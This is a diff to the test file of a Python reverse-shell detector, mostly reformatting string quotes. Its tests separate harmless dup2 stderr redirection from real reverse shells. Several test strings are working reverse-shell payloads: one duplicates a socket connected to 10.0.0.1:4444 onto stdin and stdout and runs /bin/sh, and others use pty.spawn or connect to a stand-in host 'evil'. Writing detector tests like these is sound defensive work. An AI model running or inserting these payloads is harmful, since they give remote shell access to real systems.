@@ -2366,6 +2366,7 @@ def test_the_toml_helpers_run_without_stdlib_tomllib(monkeypatch):
 # dup2 needs a socket to mean "reverse shell"
 # ──────────────────────────────────────────────────────────────────────
 
+
 def _reverse_shell_findings(source: str):
     return [
         f
@@ -2378,16 +2379,14 @@ def _reverse_shell_findings(source: str):
     "source",
     [
         # triton 3.8.0's _internal_testing.py, the shape that reddened main.
-        'import os, tempfile\n'
-        'def capture():\n'
-        '    tmp = tempfile.TemporaryFile()\n'
-        '    saved = os.dup(2)\n'
-        '    os.dup2(tmp.fileno(), 2)\n'
-        '    os.dup2(saved, 2)\n',
+        "import os, tempfile\n"
+        "def capture():\n"
+        "    tmp = tempfile.TemporaryFile()\n"
+        "    saved = os.dup(2)\n"
+        "    os.dup2(tmp.fileno(), 2)\n"
+        "    os.dup2(saved, 2)\n",
         # torch's elastic redirect plumbing: dup2 and nothing else at all.
-        'import os\n'
-        'def redirect(to_fd, from_fd):\n'
-        '    os.dup2(to_fd, from_fd)\n',
+        "import os\ndef redirect(to_fd, from_fd):\n    os.dup2(to_fd, from_fd)\n",
     ],
 )
 def test_dup2_without_a_socket_is_not_a_reverse_shell(source):
@@ -2402,11 +2401,11 @@ def test_dup2_without_a_socket_is_not_a_reverse_shell(source):
 
 def test_dup2_onto_a_socket_is_still_a_reverse_shell():
     source = (
-        'import os, socket, subprocess\n'
-        's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
+        "import os, socket, subprocess\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
         's.connect(("10.0.0.1", 4444))\n'
-        'os.dup2(s.fileno(), 0)\n'
-        'os.dup2(s.fileno(), 1)\n'
+        "os.dup2(s.fileno(), 0)\n"
+        "os.dup2(s.fileno(), 1)\n"
         'subprocess.call(["/bin/sh"])\n'
     )
     found = _reverse_shell_findings(source)
@@ -2419,8 +2418,8 @@ def test_socketless_payloads_still_fire():
     """The alternatives that never depended on dup2 are untouched."""
     assert _reverse_shell_findings('import pty\npty.spawn("/bin/bash")\n')
     assert _reverse_shell_findings(
-        'import socket, subprocess\n'
-        's = socket.socket()\n'
+        "import socket, subprocess\n"
+        "s = socket.socket()\n"
         's.connect(("evil", 1))\n'
         'subprocess.call("/bin/sh")\n'
     )
